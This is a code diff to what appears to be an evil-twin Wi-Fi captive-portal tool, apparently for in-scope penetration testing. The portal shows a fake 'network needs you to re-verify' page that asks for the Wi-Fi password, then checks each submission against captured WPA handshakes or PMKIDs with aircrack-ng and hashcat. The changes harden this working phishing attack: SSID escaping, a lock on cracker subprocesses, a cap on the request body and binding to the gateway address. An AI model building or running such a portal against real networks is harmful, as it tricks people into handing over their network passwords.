@@ -14,10 +14,14 @@ password verification requires a handshake YOU captured from the in-scope target
 
 import hashlib
 import hmac
+import html
 import json
+import shutil
 import subprocess
 import sys
 import tempfile
+import threading
+import time
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -27,6 +31,14 @@ from urllib.parse import parse_qs
 # at, and where we redirect OS connectivity-check probes so the device's captive
 # browser opens our page on its own.
 GATEWAY_IP = "10.0.0.1"
+
+# Password verification shells out to aircrack-ng / hashcat, which are expensive.
+# Serialize it so a burst of submissions (or a device that auto-POSTs) can't spawn
+# many crackers at once and exhaust CPU/RAM. The fast pure-Python PMKID path
+# handles the common case without ever taking this lock's slow branch for long.
+_VERIFY_LOCK = threading.Lock()
+# Cap on the POST body we read, so a bogus/huge Content-Length can't balloon memory.
+_MAX_BODY = 64 * 1024
 
 
 # Client-side: intercept submit → show a "Verifying…" spinner while the server
@@ -69,7 +81,9 @@ def render_page(ssid: str, error: str = "", done: bool = False) -> str:
     """Generic network-security re-authentication page. Intentionally unbranded —
     it impersonates no real company, only a plausible 'this network needs you to
     re-verify' security prompt. Asks for the Wi-Fi password only."""
-    net = ssid or "this network"
+    # Escape the SSID: it's attacker/environment-controlled (pasted from a scan),
+    # so a name with <, >, & or quotes would otherwise mangle the portal HTML.
+    net = html.escape(ssid or "this network")
     if done:
         body = f"""
       <div class="icon ok">&#10003;</div>
@@ -233,21 +247,28 @@ def verify_password(pcapng: str, hc22000: str, bssid: str, password: str):
     22000 on the .hc22000 (handles PMKID-only hcxdumptool captures)."""
     if not (8 <= len(password) <= 63):  # WPA-PSK length bounds → definitely wrong
         return False
-    # FAST path first: pure-Python PMKID check (no subprocess, ~10ms).
+    # FAST path first: pure-Python PMKID check (no subprocess, ~10ms). Stays
+    # concurrent — it's cheap and answers most hcxdumptool captures instantly.
     if hc22000 and Path(hc22000).exists():
         r = _verify_pmkid_python(hc22000, password)
         if r is not None:
             return r
-    # 4-way handshake: aircrack on the pcapng (fast when a real handshake exists).
-    wl = _write_candidate(password)
-    if pcapng and Path(pcapng).exists() and bssid:
-        r = _aircrack_verify(pcapng, bssid, wl)
-        if r is not None:
-            return r
-    # last resort: hashcat on the .hc22000 (slow startup).
-    if hc22000 and Path(hc22000).exists():
-        return _hashcat_verify(hc22000, wl)
-    return None
+    # Expensive fallback (aircrack/hashcat subprocesses): serialize so concurrent
+    # submissions can't spawn a pile of crackers, and clean up the candidate temp.
+    with _VERIFY_LOCK:
+        wl = _write_candidate(password)
+        try:
+            # 4-way handshake: aircrack on the pcapng (fast when a real handshake exists).
+            if pcapng and Path(pcapng).exists() and bssid:
+                r = _aircrack_verify(pcapng, bssid, wl)
+                if r is not None:
+                    return r
+            # last resort: hashcat on the .hc22000 (slow startup).
+            if hc22000 and Path(hc22000).exists():
+                return _hashcat_verify(hc22000, wl)
+            return None
+        finally:
+            shutil.rmtree(wl.parent, ignore_errors=True)  # throwaway candidate dir
 
 
 def portal_command(port: int, creds_path: Path, ssid: str, bssid: str = "", pcapng: str = "", hc22000: str = "") -> list[str]:
@@ -325,7 +346,11 @@ def _build_handler(creds_path: Path, ssid: str, bssid: str, pcapng: str, hc22000
                 self.end_headers()
 
         def do_POST(self):  # noqa: N802
-            length = int(self.headers.get("Content-Length", 0) or 0)
+            try:
+                length = int(self.headers.get("Content-Length", 0) or 0)
+            except ValueError:
+                length = 0
+            length = max(0, min(length, _MAX_BODY))  # cap so a huge body can't balloon memory
             raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
             fields = {k: v[0] for k, v in parse_qs(raw).items()}
             password = fields.get("password", "")
@@ -370,7 +395,21 @@ def main():
     bssid = sys.argv[4] if len(sys.argv) > 4 else ""
     pcapng = sys.argv[5] if len(sys.argv) > 5 else ""
     hc22000 = sys.argv[6] if len(sys.argv) > 6 else ""
-    server = ThreadingHTTPServer(("0.0.0.0", port), _build_handler(creds_path, ssid, bssid, pcapng, hc22000))
+    # Bind to the captive-portal gateway address only — NOT 0.0.0.0. Clients reach
+    # it at GATEWAY_IP (iptables REDIRECTs their :80 here), so binding wider would
+    # only needlessly expose the portal (and its expensive verify endpoint) on the
+    # operator's other networks. The caller assigns GATEWAY_IP to the AP interface
+    # just before launching us, so retry briefly in case it isn't up quite yet.
+    handler = _build_handler(creds_path, ssid, bssid, pcapng, hc22000)
+    server = None
+    for _ in range(20):  # ~10s
+        try:
+            server = ThreadingHTTPServer((GATEWAY_IP, port), handler)
+            break
+        except OSError:
+            time.sleep(0.5)
+    if server is None:
+        server = ThreadingHTTPServer((GATEWAY_IP, port), handler)  # final try: surface the error
     server.serve_forever()
 
 
